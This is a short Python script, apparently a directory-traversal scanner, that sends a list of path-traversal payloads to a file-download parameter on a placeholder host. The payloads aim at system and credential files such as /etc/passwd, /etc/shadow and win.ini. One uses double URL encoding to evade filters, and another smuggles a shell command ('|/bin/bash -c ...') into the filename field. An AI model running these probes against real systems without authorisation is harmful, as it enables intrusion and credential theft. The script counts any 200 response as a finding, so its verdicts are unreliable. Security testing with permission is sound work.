import requests


target_url = 'http://example.com/file?filename='


paths = [
    '../etc/passwd',  
    '../windows/win.ini',  
    '../../../../etc/passwd',  
    '../../../../windows/win.ini',  
    '/etc/passwd',  
    'C:\\windows\\win.ini',  
    '|/bin/bash -c "cat /etc/passwd"', 
    '..\\..\\..\\..\\..\\..\\windows\\win.ini',  
    '/etc/shadow',  
    'file:///etc/passwd',  
    '..%252f..%252f..%252f..%252fetc%252fpasswd'  
]

def test_directory_traversal(url, test_paths):
    print(f"Testing for Directory Traversal at {url}")
    for path in test_paths:
        full_url = f"{url}{path}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(f"Potential vulnerability found with path: {path}")
            else:
                print(f"No issue detected with path: {path}")
        except Exception as e:
            print(f"Failed to request {full_url}: {str(e)}")


test_directory_traversal(target_url, paths)
